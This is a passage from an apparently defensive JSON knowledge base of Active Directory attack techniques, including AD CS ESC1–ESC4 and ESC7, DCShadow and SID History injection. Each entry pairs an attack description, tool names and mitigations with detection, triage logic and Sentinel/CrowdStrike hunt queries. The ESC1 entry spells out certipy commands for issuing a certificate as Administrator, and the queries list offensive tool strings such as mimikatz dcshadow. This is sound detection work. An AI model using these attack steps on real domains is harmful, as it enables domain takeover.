PowerView, BloodHound (SyncLAPSPasswordエッジ)","detect":"Watch 4662 for the combination of replication-right exercise and LAPS attribute access. Detect replication from non-DCs and bulk retrieval of LAPS attributes.","events":"4662","mitigate":"Eliminate overlapping grants of replication rights and LAPS read access. Revoke replication rights from non-DCs. Audit LAPS attribute access.","triage":"On the DC pull 4662 for exercise of DS-Replication-Get-Changes (the replication property-set GUID) combined with the same principal reading the ms-Mcs-AdmPwd (LAPS) attribute, and check whether the source host is a DC/legitimate replication partner. Replication rights exercised from a non-DC/workstation that bulk-reads LAPS attributes across many computers is malicious. A single ms-Mcs-AdmPwd read by the LAPS console or a delegated helpdesk, or normal DC-to-DC replication from a known DC computer account, is benign.","hunt":[{"plat":"Sentinel","t":"One account reading LAPS attributes across many hosts in a short window = malicious / single admin read = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4662\n| where Properties has_any (\"ms-Mcs-AdmPwd\", \"ms-LAPS-Password\", \"ms-LAPS-EncryptedPassword\")\n| where AccountType == \"User\" and SubjectUserName !endswith \"$\"\n| summarize AdmPwdReads = count(), Targets = dcount(ObjectName) by SubjectUserName, Computer, bin(TimeGenerated, 1h)\n| where AdmPwdReads > 10 or Targets > 5\n| order by AdmPwdReads desc"},{"plat":"MDE","t":"Execution of LAPS-dumping tooling or explicit attribute queries = malicious / native LAPS console = benign","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where ProcessCommandLine has_any (\"ms-Mcs-AdmPwd\", \"ms-LAPS-Password\", \"LAPSToolkit\", \"Get-LAPSADPassword\", \"pyLAPS\", \"Get-AdmPwdPassword\")\n| project Timestamp, DeviceName, AccountName, FileName, InitiatingProcessFileName, ProcessCommandLine\n| order by Timestamp desc"}],"huntcs":[{"plat":"Event Search","t":"LAPS-attribute reader tooling running on a non-DC host = malicious; DC/LAPS console routine access = benign","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*ms-Mcs-AdmPwd*\" OR CommandLine=\"*ms-LAPS-EncryptedPassword*\" OR CommandLine=\"*SharpLAPS*\" OR CommandLine=\"*pyLAPS*\" OR CommandLine=\"*Get-LAPSADPassword*\" OR CommandLine=\"*LAPSToolkit*\")\n| stats count dc(ComputerName) as hosts by UserName, FileName, ParentBaseFileName\n| sort - count"},{"plat":"Identity Protection","t":"Bulk LAPS-attribute replication by a non-DC principal is caught by Identity Protection when no host process footprint exists","q":"// Falcon Identity Protection detection: Directory Services attribute access / LAPS password read (4662 DS-Access on ms-Mcs-AdmPwd is DC-only, not in Falcon EDR). Correlate the attacker host via ProcessRollup2/NetworkConnectIP4 LDAP 389/636 to DCs."}]},{"name":"AD CS Template ACL Abuse (ESC4)","aka":"ESC4 / certificate template WriteDacl / GenericWrite","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1649, T1222.001","cve":"","sev":"Critical","summary":"Write access to a certificate template object lets an attacker alter it into a vulnerable configuration (e.g. ENROLLEE_SUPPLIES_SUBJECT), turning it into ESC1.","how":"A principal with WriteDacl/GenericWrite/GenericAll/WriteOwner on a pKICertificateTemplate object writes mspki-certificate-name-flag (arbitrary SubjectAltName), a Client Authentication EKU, and lowered issuance requirements to make it ESC1-equivalent. It then requests a certificate as Administrator and impersonates a domain admin via PKINIT. The original settings are restored after use.","tools":"Certipy (template edit/relback), PowerView, ADSIEdit, Certify, ntlmrelayx","detect":"Watch 5136 for attribute changes on pKICertificateTemplate objects (msPKI-Certificate-Name-Flag, msPKI-Enrollment-Flag, pKIExtendedKeyUsage, nTSecurityDescriptor). Correlate AD CS issuance logs (4886/4887) for anomalous SAN requests.","events":"5136, 4886, 4887, 4899(テンプレート更新)","mitigate":"Minimize certificate template ACLs so only Tier0 can edit. Audit and alert on template changes. Require manager approval for CA issuance and disable arbitrary SAN specification.","triage":"On the DC pull 5136 for pKICertificateTemplate attribute changes (enabling msPKI-Certificate-Name-Flag CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT, adding Client Authentication EKU to pKIExtendedKeyUsage, loosening msPKI-Enrollment-Flag, nTSecurityDescriptor) and check whether the modifier is a PKI admin. Template edit → CA 4886/4887 issuing a cert with an attacker-specified SAN (right after the edit, non-admin requester) → settings reverted — the edit/abuse/revert chain — is malicious. A PKI-team template update (4899) tied to a change ticket, scheduled maintenance, and PAW, with no SAN loosening, is benign.","hunt":[{"plat":"Sentinel","t":"Change to a cert template's SD or Enrollment/Name-Flag/EKU attributes = malicious / planned PKI admin edit = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where ObjectName has \"CN=Certificate Templates,CN=Public Key Services\"\n| where Properties has_any (\"nTSecurityDescriptor\", \"msPKI-Certificate-Name-Flag\", \"msPKI-Enrollment-Flag\", \"pKIExtendedKeyUsage\")\n| project TimeGenerated, Computer, SubjectUserName, SubjectDomainName, ObjectName, OperationType, Properties\n| order by TimeGenerated desc"},{"plat":"MDE","t":"Certipy/Certify writing or weakening a template = malicious / manual certutil template read = benign","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where ProcessCommandLine has_any (\"certipy\", \"Certify.exe\", \"Certify \")\n| where ProcessCommandLine has_any (\"template\", \"-write-default-configuration\", \"ESC4\", \"-save-old\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine\n| order by Timestamp desc"}],"huntcs":[{"plat":"LogScale","t":"certipy/Certify writing a template's DACL/name-flag = malicious; PKI admin ADSI Edit routine = benign","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(certipy.*template|Certify.*(write|template)|Set-ADObject.*pKICertificateTemplate|msPKI-Certificate-Name-Flag|nTSecurityDescriptor)/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName], function=count(as=cnt))\n| sort(cnt, order=desc)"}]},{"name":"AD CS CA Role Abuse (ESC7)","aka":"ESC7 / ManageCA / ManageCertificates rights","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1649","cve":"","sev":"Critical","summary":"ManageCA/ManageCertificates rights on the CA itself allow abusing certificate issuance by enabling vulnerable templates or approving failed requests.","how":"A principal with ManageCA (CA administrator) rights on the CA object/service enables the SubjectAltName extension (EDITF_ATTRIBUTESUBJECTALTNAME2) to reach ESC6, or with ManageCertificates (certificate manager) rights approves pending/failed certificate requests. This yields a certificate with an arbitrary SAN and escalates to domain admin.","tools":"Certipy (ca -add-officer/-enable-template/-issue), PSPKI, Certify","detect":"Watch for CA configuration changes (EDITF_ATTRIBUTESUBJECTALTNAME2) and anomalous certificate-manager approvals. Correlate 4890/4882 (CA permission/config changes) with 4888 (request denied) -> 4887 (issued) or 4889 (pending) -> 4887 for the same Request ID to catch forced approvals (4885 = audit-filter change, not an approval event).","events":"4882, 4887(発行), 4888(要求拒否), 4889(要求保留), 4890, 4885(監査フィルタ変更=改ざん指標)","mitigate":"Strictly control ManageCA/ManageCertificates rights and limit to Tier0. Disable EDITF_ATTRIBUTESUBJECTALTNAME2. Enable auditing of CA configuration/issuance and minimize certificate-manager approvals.","triage":"On the CA server security log pull 4890/4882 (CA security / config permission changes) and check for enabling EDITF_ATTRIBUTESUBJECTALTNAME2, granting ManageCA/ManageCertificates, or adding an officer, judging whether the modifier is a legitimate CA admin. If, after SAN-attribute enablement or via certificate-manager forced approval (certipy ManageCertificates shows 4888 [request denied] -> 4887 [issued] for the same Request ID; a genuine pending path is 4889 -> 4887; 4885 is an audit-filter change, not an approval, tracked separately as a tamper indicator), an auth-capable cert with an arbitrary SAN is issued to a non-admin, it is malicious. Legitimate CA-officer delegation by the PKI ops team or documented config change (ticket, scheduled, PAW) is benign.","hunt":[{"plat":"Sentinel","t":"CA security-permission change (4882) or cert-manager setting change (4890) = malicious / scheduled CA maintenance = benign","q":"SecurityEvent\n| where TimeGenerated > ago(7d)\n| where EventID in (4882, 4885, 4890)\n| project TimeGenerated, Computer, EventID, Activity, SubjectUserName, SubjectDomainName, Properties\n| order by TimeGenerated asc"},{"plat":"MDE","t":"certutil -setreg enabling EDITF_ATTRIBUTESUBJECTALTNAME2 = malicious (arbitrary SAN) / plain CA reg read = benign","q":"DeviceProcessEvents\n| where Timestamp > ago(7d)\n| where ProcessCommandLine has \"certutil\"\n| where ProcessCommandLine has_any (\"EDITF_ATTRIBUTESUBJECTALTNAME2\", \"-setreg\", \"policy\\\\EditFlags\")\n| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine\n| order by Timestamp desc"}],"huntcs":[{"plat":"Event Search","t":"certipy/certutil touching CA ManageCA config or EDITF_ATTRIBUTESUBJECTALTNAME2 = malicious; CA admin routine certutil = benign","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*EDITF_ATTRIBUTESUBJECTALTNAME2*\" OR CommandLine=\"*ca*-config*\" OR (CommandLine=\"*certipy*\" AND CommandLine=\"*ca*\") OR CommandLine=\"*setextension*\" OR CommandLine=\"*-setreg*policy*EditFlags*\")\n| stats count by ComputerName, UserName, FileName, ParentBaseFileName\n| sort - count"}]},{"name":"OU/Container ACL Abuse (Inheritance)","aka":"WriteDacl/GenericAll on OU / inherited ACE abuse","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1222.001, T1098","cve":"","sev":"High","summary":"Write access to an OU/container lets an attacker set inherited ACEs to control all child objects, or manipulate child objects directly.","how":"A principal with WriteDacl/GenericAll on an OU/container adds an inheritable ACE (CONTAINER_INHERIT) to propagate GenericAll to all child users/computers. Alternatively it combines gPLink rewriting or LAPS attribute delegation to seize child machines. Delegation misconfigurations give it broad impact.","tools":"PowerView (Add-DomainObjectAcl -Inheritance), impacket dacledit.py, BloodHound","detect":"Watch 5136 for nTSecurityDescriptor changes on OUs/containers, especially inherited-ACE additions. Periodically scan whether unexpected inherited permissions have propagated to child objects.","events":"5136, 4662","mitigate":"Design OU delegation with least privilege and eliminate WriteDacl. Periodically inventory inherited ACEs. Baseline ACLs of the OU structure (including Tier0) and detect deviations.","triage":"On the DC pull 5136 for nTSecurityDescriptor changes on OUs/containers and check whether the added ACE is inheritable (CONTAINER_INHERIT_ACE) granting GenericAll/WriteDacl and whether the grantee is an unexpected principal. A low-privilege principal adding an inheritable ACE to a broad OU, propagating unexpected rights to child objects and chaining into 4662 (extended-right use on children) or gPLink/LAPS delegation abuse, is malicious. Legitimate OU delegation by the IAM team per a delegation design, matching a change ticket, known delegation groups, and periodic scan baselines, is benign.","hunt":[{"plat":"Sentinel","t":"Inherited ACE (CI) added to an OU/container SD = malicious (propagates down) / planned delegation = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where ObjectType has \"organizationalUnit\" or ObjectName has \"OU=\" or ObjectName has \"CN=System\"\n| where Properties has \"nTSecurityDescriptor\"\n| where Properties has \"CI\" or Properties has \"OA;CI\"\n| project TimeGenerated, Computer, SubjectUserName, ObjectName, OperationType, Properties\n| order by TimeGenerated desc"}],"huntcs":[{"plat":"LogScale","t":"PowerView/dsacls adding an inherited ACE to an OU/container DACL = malicious; sanctioned delegation change = benign","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(Set-DomainObjectAcl|Add-DomainObjectAcl|dsacls.*\\/(g|i)|Set-Acl.*OU=|GenericAll|WriteDacl)/i\n| CommandLine=/OU=|CN=|DC=/i\n| groupBy([ComputerName, UserName, FileName], function=count(as=cnt))\n| sort(cnt, order=desc)"}]},{"name":"Logon Script / scriptPath Write","aka":"GenericWrite -> scriptPath tampering / logon script abuse","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1037.003, T1098","cve":"","sev":"Medium","summary":"Rewrite a user's scriptPath (or profilePath) attribute to run an arbitrary script at logon.","how":"A principal with GenericWrite/GenericAll on a user rewrites the scriptPath attribute to an attacker-controlled script (e.g. on NETLOGON). When the target next logs on, code executes in their context. UNC rewrites of profilePath/homeDirectory are also used to coerce NTLM authentication.","tools":"PowerView (Set-DomainObject scriptPath), ADSIEdit, ntlmrelayx(強制認証連携)","detect":"Watch 5136 for scriptPath/profilePath/homeDirectory attribute changes. Use FIM to detect suspicious script additions on NETLOGON/SYSVOL. Correlate anomalous post-logon processes (4688).","events":"5136, 4688, 5145","mitigate":"Eliminate GenericWrite delegation on user objects. Audit scriptPath changes. Protect logon-script storage locations with FIM and restrict execution.","triage":"On the DC pull 5136 for changes to a user's scriptPath/profilePath/homeDirectory and check the modifier and whether the new value is an expected NETLOGON script or an attacker-controlled UNC. An unexpected principal repointing scriptPath to a suspicious script — followed by 4688 showing a suspicious process from that script at the target's next logon, or profilePath/homeDirectory pointed at an external UNC to coerce NTLM auth — is malicious. Legitimate scriptPath configuration by the logon-script team or account provisioning (HR sync), using an approved NETLOGON script and scheduled changes, is benign.","hunt":[{"plat":"Sentinel","t":"User scriptPath/profilePath/homeDirectory tampered = malicious (runs at logon) / bulk IT profile setup = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has_any (\"scriptPath\", \"profilePath\", \"homeDirectory\")\n| where SubjectUserName !endswith \"$\"\n| project TimeGenerated, Computer, SubjectUserName, ObjectName, OperationType, Properties\n| order by TimeGenerated desc"},{"plat":"MDE","t":"New/modified script under SYSVOL/NETLOGON = malicious / legit GPO script push = benign","q":"DeviceFileEvents\n| where Timestamp > ago(1d)\n| where FolderPath has_any (\"\\\\SYSVOL\\\\\", \"\\\\NETLOGON\\\\\")\n| where FileName endswith \".bat\" or FileName endswith \".cmd\" or FileName endswith \".vbs\" or FileName endswith \".ps1\"\n| where ActionType in (\"FileCreated\", \"FileModified\")\n| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessAccountName, InitiatingProcessCommandLine\n| order by Timestamp desc"}],"huntcs":[{"plat":"LogScale","t":"GenericWrite tampering scriptPath/profilePath = malicious; IT admin bulk profile config = benign","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(scriptPath|profilePath|homeDirectory)/i\n| CommandLine=/(Set-DomainObject|Set-ADUser|ldapmodify|Set-ADObject)/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName], function=count(as=cnt))\n| sort(cnt, order=desc)"},{"plat":"Event Search","t":"userinit/explorer spawning a script from NETLOGON/SYSVOL = malicious; known GPO logon script = benign","q":"event_simpleName=ProcessRollup2 (FileName=\"wscript.exe\" OR FileName=\"cscript.exe\" OR FileName=\"powershell.exe\" OR FileName=\"cmd.exe\") ParentBaseFileName=\"userinit.exe\" (CommandLine=\"*NETLOGON*\" OR CommandLine=\"*SYSVOL*\" OR CommandLine=\"*sysvol*\")\n| stats count dc(ComputerName) as hosts by UserName, FileName\n| sort - hosts"}]},{"name":"AllExtendedRights","aka":"All Extended Rights / DS-Control-Access (all extended rights)","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1098, T1003.006","cve":"","sev":"High","summary":"All extended rights over a target. Enables comprehensive extended operations such as ForceChangePassword, DCSync, and LAPS/gMSA read.","how":"A principal with AllExtendedRights can exercise every applicable extended right depending on the target: ForceChangePassword (user), DS-Replication-Get-Changes family (domain = DCSync), LAPS/gMSA password read, and so on. Shown as BloodHound's AllExtendedRights edge, it branches into the optimal follow-on attack per target.","tools":"PowerView, impacket (secretsdump.py, changepasswd.py), mimikatz, BloodHound","detect":"Watch 4662 for extended-right exercise keyed to the target GUID. Inventory principals holding AllExtendedRights ACEs and correlate follow-on events such as ForceChangePassword (4724) and replication (4662).","events":"4662, 4724","mitigate":"Remove AllExtendedRights ACEs and replace with specific least-privilege rights. Eliminate grants on sensitive objects (domain/DC/protected accounts) and audit periodically.","triage":"On the DC pull 4662 for extended-right use per the object GUID (User-Force-Change-Password, DS-Replication-Get-Changes, LAPS/gMSA read), checking the principal, target, and source host. An AllExtendedRights holder chaining into follow-on events — 4724 plus an anomalous logon of the target account for a forced password change, or DCSync-like 4662 from a non-DC for replication — is malicious. Legitimate helpdesk ForceChangePassword (4724 as a verified reset workflow) or delegated LAPS/gMSA reads matching known operations are benign.","hunt":[{"plat":"Sentinel","t":"Non-machine principal exercising DS-Control-Access (0x100) over multiple objects = malicious / single delegated op = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4662\n| where AccessMask has \"0x100\"\n| where AccountType == \"User\" and SubjectUserName !endswith \"$\"\n| summarize Rights = count(), Objs = dcount(ObjectName) by SubjectUserName, Computer, bin(TimeGenerated, 1h)\n| where Objs > 3\n| order by Objs desc"},{"plat":"Sentinel","t":"One actor force-resetting many account passwords (4724) fast = malicious / one-off helpdesk reset = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4724\n| where SubjectUserName !endswith \"$\"\n| summarize Resets = count(), Targets = make_set(TargetUserName, 20) by SubjectUserName, Computer, bin(TimeGenerated, 1h)\n| where Resets > 2\n| order by Resets desc"}],"huntcs":[{"plat":"Event Search","t":"Tooling exercising AllExtendedRights (ForceChangePassword etc.) = malicious; helpdesk password reset = benign","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*Set-DomainUserPassword*\" OR CommandLine=\"*ForceChangePassword*\" OR CommandLine=\"*net user*/domain*\" OR CommandLine=\"*Set-ADAccountPassword*-Reset*\" OR CommandLine=\"*targetedKerberoast*\")\n| stats count dc(ComputerName) as hosts by UserName, FileName, ParentBaseFileName\n| sort - count"},{"plat":"Identity Protection","t":"4662 extended-right exercise (per control-access GUID) is a DC-only event caught by Identity Protection","q":"// Falcon Identity Protection detection: DS-Access / Control-Access-Right exercised (AllExtendedRights). 4662 is DC-only; pivot to attacker host ProcessRollup2 for the reset/replication tooling."}]},{"name":"DCShadow","aka":"mimikatz lsadump::dcshadow / rogue DC registration","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1207","cve":"","sev":"Critical","summary":"With high-privilege ACLs (replication/write rights on the domain/Configuration), temporarily register a rogue DC and tamper with arbitrary object attributes via replication.","how":"A principal with replication rights on the domain/Configuration partition and object-creation rights (e.g. DS-Install-Replica) temporarily registers its own host as a DC and rewrites sidHistory, primaryGroupID, ACLs, etc. via a replication push. It readily evades normal change logs and is used for stealthy persistence and privilege escalation.","tools":"mimikatz (lsadump::dcshadow /push), impacket(一部)","detect":"Watch for temporary nTDSDSA/server object creation/deletion in the Configuration partition (5137/5141). Detect replication from unexpected hosts (4662) and short-lived DC registrations.","events":"4662, 5137, 5141, 4928/4929","mitigate":"Limit replication and Configuration write rights to DCs/Enterprise Admins. Alert on anomalous DC registrations. Strictly control Tier0 privileges to eliminate the prerequisites for DCShadow.","triage":"On the DC pull 5137/5141 for transient creation/deletion of nTDSDSA/server objects in the Configuration partition and check for a non-DC host being briefly registered as a DC. If replication from an unexpected host (4662 exercising DS-Replication-Get-Changes/DS-Install-Replica, 4928/4929 establishing a replication source) occurs in a short window and pushes suspicious sidHistory/primaryGroupID/ACL changes without corresponding legitimate change logs, it is malicious. A genuine DC promotion (dcpromo) or legitimate replication-topology change with a known DC computer account, change ticket, and persistent registration is benign.","hunt":[{"plat":"Sentinel","t":"Short-lived nTDSDSA/server objects created/deleted in Configuration (5137/5141) = malicious rogue DC / genuine DCPROMO = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (5137, 5141)\n| where ObjectName has \"CN=Configuration\" and (Properties has \"nTDSDSA\" or ObjectName has \"CN=Sites\" or ObjectName has \"CN=Servers\")\n| project TimeGenerated, Computer, EventID, SubjectUserName, ObjectName, OperationType\n| order by TimeGenerated asc"},{"plat":"MDI","t":"Directory replication sourced from a host that is not a known DC = malicious (DCShadow/DCSync) / DC-to-DC replication = benign","q":"IdentityDirectoryEvents\n| where Timestamp > ago(1d)\n| where ActionType == \"Directory Services replication\"\n| summarize Ops = count() by DeviceName, AccountName, IPAddress, DestinationDeviceName\n| order by Ops desc\n// exclude legitimate domain controllers by DeviceName; any other source = DCShadow/DCSync suspicion"}],"huntcs":[{"plat":"Event Search","t":"mimikatz lsadump::dcshadow execution = malicious; legitimate dcpromo promotion = benign","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*dcshadow*\" OR CommandLine=\"*lsadump::*\" OR CommandLine=\"*mimikatz*\" OR CommandLine=\"*/push*\" OR CommandLine=\"*server::*\")\n| stats count by ComputerName, UserName, FileName, ParentBaseFileName\n| sort - count"},{"plat":"LogScale","t":"A non-DC host making RPC/135 connections to DCs (grouped per destination DC) from a replication-capable process = malicious; monitoring-agent admin traffic = benign","q":"#event_simpleName=NetworkConnectIP4\n| RemotePort=135\n| ContextBaseFileName=/lsass\\.exe|mimikatz|rundll32/i\n| groupBy([ComputerName, ContextBaseFileName, RemoteAddressIP4], function=count(as=conns))\n| sort(conns, order=desc)"}]},{"name":"SID History Injection via Write","aka":"sIDHistory write / SID History injection via DCShadow","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1134.005","cve":"","sev":"High","summary":"Writing to the sIDHistory attribute (typically via DCShadow/replication) injects a privileged group SID that gets inherited into the token.","how":"Normally requires LSA/replication privileges, but a principal with DCShadow or replication-write rights injects a SID such as Domain Admins (RID 512) into the target account's sIDHistory. At logon that SID is included in the token, granting privileges without actual group membership — a persistence technique.","tools":"mimikatz (sid::add, lsadump::dcshadow), DSInternals (Add-ADDBSidHistory)","detect":"Monitor sIDHistory attribute changes via 5136. Periodically scan for anomalous accounts whose sIDHistory contains privileged RIDs (e.g., 512). Correlate DCShadow artifacts (5137/5141).","events":"5136, 4765/4766(SID History追加/失敗)","mitigate":"Inventory accounts with sIDHistory and remove unneeded entries. Enable SID filtering. After migration completes, clear sIDHistory and tightly control replication rights.","triage":"On the DC security log pull 5136 (Value Added) showing changes to the target account's sIDHistory attribute and check whether the added value contains a privileged RID (512/519/518/516). It is malicious if 4765/4766 (SID History add/fail) plus DCShadow artifacts 5137 (object create)/5141 (delete) or rogue replication-source registration chain from the same non-privileged principal that lacks DA/replication rights. It is benign if ADMT-based legitimate domain migration/consolidation or an approved IDM/migration tool ran under a service account in business hours matching a change ticket. A single 5136 with no privileged RID inside a known migration window leans benign.","hunt":[{"plat":"Sentinel","t":"Write to sIDHistory (5136) or SID History add (4765/4766) = malicious priv-RID injection / legit ADMT migration = benign","q":"SecurityEvent\n| where TimeGenerated > ago(7d)\n| where EventID in (4765, 4766, 5136)\n| where EventID != 5136 or Properties has \"sIDHistory\"\n| project TimeGenerated, Computer, EventID, SubjectUserName, TargetUserName, ObjectName, Properties\n| order by TimeGenerated desc"},{"plat":"MDI","t":"SID History change observed in directory = malicious (rare outside migration) / expected during migration = benign","q":"IdentityDirectoryEvents\n| where Timestamp > ago(7d)\n| where ActionType has \"SID history\"   // confirm ActionType in your tenant\n| project Timestamp, ActionType, AccountName, TargetAccountUpn, TargetAccountDisplayName, DeviceName, IPAddress\n| order by Timestamp desc"}],"huntcs":[{"plat":"LogScale","t":"mimikatz sid::add / sIDHistory-write tooling = malicious; ADMT migration SIDHistory grant = benign","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(sid::add|sid::patch|sIDHistory|Add-DomainSidHistory|DsAddSidHistory)/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName], function=count(as=cnt))\n| sort(cnt, order=desc)"}]},{"name":"ESC1 - Misconfigured Certificate Templates (Enrollee Supplies Subject)","aka":"Abuse of SAN-specifiable templates","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649","cve":"","sev":"Critical","summary":"When a template has the Client Authentication EKU and lets the enrollee supply an arbitrary Subject Alternative Name (SAN), an attacker issues a certificate embedding an arbitrary user's (e.g., Domain Admin) UPN to impersonate them.","how":"Prerequisites: the template has CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (msPKI-Certificate-Name-Flag), includes one of the Client Auth/PKINIT/Smartcard Logon/Any Purpose EKUs, grants Enroll rights to low-privileged users, and requires no manager approval. Identify ESC1 templates with `Certipy find -vulnerable`, then issue with `certipy req -ca <CA> -template <tmpl> -upn administrator@domain.local` specifying the DA UPN in the SAN, and run `certipy auth -pfx admin.pfx` with the resulting PFX to obtain a TGT/NT hash.","tools":"Certipy (find/req/auth), Certify.exe request /altname, Rubeus asktgt /certificate, openssl","detect":"On the CA, monitor events 4886 (certificate request)/4887 (certificate issued) for cases where the Subject and requester account mismatch (a low-privileged requester but administrator in the SAN). Cross-check the requesting template name against the SAN UPN domain. Correlate PKINIT-derived 4768 (encryption type / Certificate Information field).","events":"4886, 4887, 4768(PKINIT), 4624","mitigate":"Remove CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT from the template and build the Subject from AD instead. Always require manager approval (CA Certificate Manager Approval) on templates with Client Auth EKUs and minimize Enroll rights. Continuously inventory using the `certipy find` vulnerability report.","triage":"On the CA pull 4886/4887 and flag mismatches where a low-privilege Requester obtains a cert whose SAN/UPN is a privileged principal like administrator, cross-checking that the template has ENROLLEE_SUPPLIES_SUBJECT plus a Client Auth EKU. It is malicious if that PFX is immediately used for PKINIT, seen as 4768 (Certificate Information serial/issuer, encryption type) with the same serial and privileged SAN UPN, followed by 4624/4672 for that account. It is benign when legitimate helpdesk/HR issuance has Requester equal to Subject, or smartcard enrollment-on-behalf was done by a PKI/SCCM admin inside an approval workflow. A single 4887 where SAN matches the requester's own domain in business hours leans benign.","hunt":[{"plat":"Sentinel","t":"Issued cert (4887) whose SAN/UPN differs from the requester (e.g. administrator) = malicious ESC1 / requester==subject = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4886, 4887)\n| where Properties has \"SubjectAltName\" or Properties has \"san:\" or Properties has \"UPN\"\n| project TimeGenerated, Computer, EventID, Account, SubjectUserName, ObjectName, Properties\n| order by TimeGenerated desc\n// flag rows where the SAN UPN does not match the requesting Account (low-priv requester, high-priv SAN)"},{"plat":"Sentinel","t":"PKINIT 4768 with certificate info correlated to issued cert = malicious (TGT via forged SAN) / genuine smartcard logon = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4768\n| where Properties has \"Certificate\"\n| project TimeGenerated, Computer, TargetUserName, TargetDomainName, IpAddress, ServiceName, TicketEncryptionType, Properties\n| order by TimeGenerated desc"}],"huntcs":[{"plat":"Event Search","t":"certipy/Certify requesting a cert with attacker-supplied SAN/UPN = malicious; normal auto-enroll = benign","q":"event_simpleName=ProcessRollup2 ((CommandLine=\"*certipy*\" AND CommandLine=\"*req*\") OR (CommandLine=\"*Certify*\" AND CommandLine=\"*/altname*\")) (CommandLine=\"*upn*\" OR CommandLine=\"*altname*\" OR CommandLine=\"*administrator*\")\n| stats count by ComputerName, UserName, FileName, ParentBaseFileName\n| sort - count"},{"plat":"LogScale","t":"Rubeus PKINIT turning the ESC1 cert into a TGT = malicious; genuine smartcard PKINIT = benign","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/asktgt/i\n| CommandLine=/(\\/certificate|\\/getcredentials|\\.pfx)/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName], function=count(as=cnt))\n| sort(cnt, order=desc)"}]},{"name":"ESC2 - Any Purpose EKU / No EKU (SubCA) Template","aka":"Any Purpose EKU abuse","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649","cve":"","sev":"High","summary":"When a template's EKU is Any Purpose (2.5.29.37.0) or has no EKU (SubCA-equivalent), issued certificates can be used for any purpose (including client authentication), enabling impersonation as the enrollee (client authentication) or, for the Any Purpose EKU case, code/document signing (an end-entity certificate lacks CA basic constraints (isCA=TRUE) and cannot sign new certificates).","how":"Prerequisites: the template has the Any Purpose EKU or an empty EKU, with Enroll rights for low-privileged users. Enroll as in ESC1; even when SAN cannot be specified, the certificate can be used for authentication, signing, or any purpose. If SAN can be specified, perform UPN impersonation as in ESC1; if not, repurpose the obtained certificate for other attacks (signing).","tools":"Certipy req, Certify request, Rubeus","detect":"Detect issuance from templates with Any Purpose/empty EKU via 4886/4887. In particular, monitor SubCA/general-purpose template enrollment by low-privileged accounts as anomalous.","events":"4886, 4887","mitigate":"Restrict template EKUs to the minimum required for the business (e.g., Client Authentication only), and remove Enroll rights on Any Purpose/empty-EKU templates or make manager approval mandatory.","triage":"On the CA pull 4886/4887 for issuances from templates whose EKU is Any Purpose (2.5.29.37.0) or empty (SubCA-equivalent) and check whether the requester is a low-privilege account. It is malicious if a low-priv account requests the general/SubCA template and either forges a UPN via SAN or the resulting cert is repurposed for signing/another attack (nearby 4768 or anomalous auth). It is benign when a PKI/CA operations team issued a SubCA/cross-cert as planned matching change management, or issued a limited-EKU cert for monitoring/validation. A single issuance with no downstream auth reuse leans benign.","hunt":[{"plat":"Sentinel","t":"Issuance from an Any-Purpose EKU (2.5.29.37.0) or no-EKU template = malicious (unrestricted cert) / scoped-EKU issue = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4886, 4887)\n| where Properties has \"2.5.29.37.0\" or Properties has \"Any Purpose\"\n| summarize Requests = count() by Account, SubjectUserName, ObjectName, bin(TimeGenerated, 1h)\n| order by Requests desc"}],"huntcs":[{"plat":"LogScale","t":"Cert-request tooling targeting an Any-Purpose/No-EKU (SubCA) template = malicious; sanctioned SubCA use = benign","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(certipy.*req|Certify.*request)/i\n| CommandLine=/(SubCA|Any\\s*Purpose|AnyPurpose|-template)/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName], function=count(as=cnt))\n| sort(cnt, order=desc)"}]},{"name":"ESC3 - Enrollment Agent Template Abuse","aka":"Certificate Request Agent EKU abuse","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649","cve":"","sev":"High","summary":"Obtain an enrollment agent certificate from a template with the Certificate Request Agent EKU (1.3.6.1.4.1.311.20.2.1), then use that agent authority to issue certificates on behalf of other users (e.g., DA) and impersonate them.","how":"Prerequisites: low-privileged Enroll rights on an Enrollment Agent EKU template, and a template that permits enroll-on-behalf-of. Steps: (1) obtain 